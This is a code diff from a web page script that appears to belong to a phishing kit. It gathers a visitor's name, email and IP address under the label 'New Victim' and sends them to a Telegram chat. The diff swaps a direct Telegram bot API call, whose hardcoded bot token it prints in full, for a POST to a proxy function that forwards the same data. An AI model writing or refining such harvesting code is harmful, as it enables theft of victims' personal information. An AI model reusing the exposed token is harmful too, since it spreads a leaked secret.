@@ -99,22 +99,25 @@
           // Format the message to send to Telegram
           const message = `New Victim:\nName: ${name}\nEmail: ${email}\nIP Address: ${userIP}`;
 
-          // Telegram Bot Token (replace with your bot token)
-          const telegramBotToken = '7692336149:AAEzxkFa7bvYSAZNwAsiSTQux2GV_P6XSUE';
-          
-          // Telegram API URL with dynamic chat_id from the URL
-          const telegramURL = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
-
-          // Send message to Telegram bot
-          fetch(telegramURL)
-            .then(response => response.json())
-            .then(data => {
-              alert("Message sent to Telegram!");
+          // Send the data to the proxy server (Firebase function)
+          fetch('https://your-firebase-function-url/sendToTelegram', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+              chat_id: chatId,   // Chat ID for the target user/group
+              message: message   // The message you want to send
             })
-            .catch(error => {
-              alert("Error sending message.");
-              console.error("Error:", error);
-            });
+          })
+          .then(response => response.json())
+          .then(data => {
+            alert("Message sent to Telegram!");
+          })
+          .catch(error => {
+            alert("Error sending message.");
+            console.error("Error:", error);
+          });
         })
         .catch(error => {
           alert("Error fetching user IP.");
